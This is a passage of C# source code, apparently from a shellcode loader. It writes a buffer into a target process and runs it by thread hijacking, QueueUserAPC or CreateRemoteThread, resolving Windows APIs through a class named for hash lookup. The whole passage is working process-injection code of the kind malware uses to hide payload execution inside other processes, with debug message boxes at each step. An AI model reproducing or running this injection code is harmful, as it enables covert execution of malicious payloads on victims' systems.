        IntPtr zero = IntPtr.Zero;
        if (!NativeFromHashes.WriteProcessMemory(hProcess, intPtr, array, (uint)array.Length, out zero))
        {
            NativeFromHashes.MessageBoxW(IntPtr.Zero, "wreiteprocesmemoryfailed", "Debug INfo", 64U);
            return;
        }

        const InjectionTechnique injection = InjectionTechnique.SetThreadExecution;

        switch (injection)
        {
            case InjectionTechnique.SetThreadExecution:
                if (!SetThreadExecution(hThread, intPtr))
                {
                    NativeFromHashes.MessageBoxW(IntPtr.Zero, "SetThreadExecution failed", "Debug INfo", 64U);
                    return;
                }
                break;

            case InjectionTechnique.QueueUserApc:
                if (NativeFromHashes.QueueUserAPC(intPtr, hThread, IntPtr.Zero) == 0)
                {
                    NativeFromHashes.MessageBoxW(IntPtr.Zero, "QueueUserAPC failed", "Debug INfo", 64U);
                    return;
                }
                NativeFromHashes.ResumeThread(hThread);
                break;

            case InjectionTechnique.CreateRemoteThread:
                IntPtr shellThread = NativeFromHashes.CreateRemoteThread(
                    hProcess,
                    IntPtr.Zero,
                    0,
                    intPtr,
                    IntPtr.Zero,
                    0,
                    IntPtr.Zero);
                if (shellThread == IntPtr.Zero)
                {
                    NativeFromHashes.MessageBoxW(IntPtr.Zero, "CreateRemoteThread failed", "Debug INfo", 64U);
                    return;
                }
                NativeFromHashes.ResumeThread(hThread);
                break;
        }

        NativeFromHashes.MessageBoxW(IntPtr.Zero, "injection finished", "Debug INfo", 64U);
    }
}

